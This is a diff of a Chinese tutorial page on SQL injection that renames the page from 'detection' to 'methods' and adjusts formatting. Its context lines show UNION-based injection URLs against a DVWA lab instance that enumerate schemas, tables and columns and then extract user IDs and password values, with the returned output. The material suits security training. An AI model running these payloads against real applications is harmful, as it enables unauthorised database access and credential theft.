@@ -1,4 +1,4 @@
-注入检测
+注入方法
 =====================================
 
 常见的注入点
@@ -75,6 +75,7 @@ MYSQL实战
 - 查询数据库
 	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select null,schema_name from information_schema.schemata--+&Submit=Submit#``
 	::
+	
 		ID: 1' union select null,schema_name from information_schema.schemata-- 
 		First name: admin
 		Surname: admin
@@ -90,6 +91,7 @@ MYSQL实战
 - 查询表名
 	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select table_schema,table_name from information_schema.tables where table_schema!='information_schema'--+&Submit=Submit#``
 	::
+	
 		ID: 1' union select table_schema,table_name from information_schema.tables where table_schema!='information_schema'-- 
 		First name: admin
 		Surname: admin
@@ -105,6 +107,7 @@ MYSQL实战
 - 查询列名
 	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select table_name,column_name from information_schema.columns where table_name='users'--+&Submit=Submit#``
 	::
+	
 		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
 		First name: admin
 		Surname: admin
@@ -136,6 +139,7 @@ MYSQL实战
 - 查询数据
 	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select user_id,password from users--+&Submit=Submit#``
 	::
+	
 		ID: 1' union select user_id,password from users-- 
 		First name: admin
 		Surname: admin
